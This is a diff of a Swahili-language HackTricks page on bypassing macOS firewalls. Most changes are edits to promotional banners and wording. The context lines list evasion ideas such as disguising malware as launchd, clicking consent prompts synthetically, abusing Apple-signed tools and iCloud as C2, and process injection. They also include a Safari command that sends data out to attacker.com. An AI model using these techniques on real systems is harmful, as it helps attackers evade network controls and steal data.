@@ -1,18 +1,19 @@
 # Kupitisha Firewalls ya macOS
 
+{% hint style="success" %}
+Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Mbinu Zilizopatikana
 
@@ -20,23 +21,23 @@ Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewal
 
 ### Kutumia majina ya orodha nyeupe vibaya
 
-* Kwa mfano kuita zisizo na programu hasidi majina ya michakato inayojulikana vizuri ya macOS kama vile **`launchd`**
+* Kwa mfano kuita zisizo na programu hasidi kwa majina ya michakato inayojulikana ya macOS kama vile **`launchd`**
 
-### Bonyeza ya Kisynthetic
+### Bonyeza Kisynthetic
 
-* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya zisizo na programu hasidi **bonyeza kwenye ruhusu**
+* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya programu hasidi **ibonyeze ruhusa**
 
 ### **Tumia programu zilizosainiwa na Apple**
 
 * Kama vile **`curl`**, lakini pia nyingine kama **`whois`**
 
-### Vipeni vya Apple vilivyofahamika
+### Vipeni vya Apple vinavyojulikana
 
-Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vilivyofahamika kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
+Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vinavyojulikana kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
 ### Kupitisha Kwa Ujumla
 
-Mawazo kadhaa kujaribu kupitisha firewalls
+Mawazo kadhaa ya jaribu kupitisha firewalls
 
 ### Angalia trafiki iliyoruhusiwa
 
@@ -79,7 +80,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### Kupitia sindano za michakato
 
-Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua kinga ya firewall:
+Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kudukua ulinzi wa firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -89,16 +90,17 @@ Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuungan
 
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
+{% hint style="success" %}
+Jifunze & jifunze AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & jifunze GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
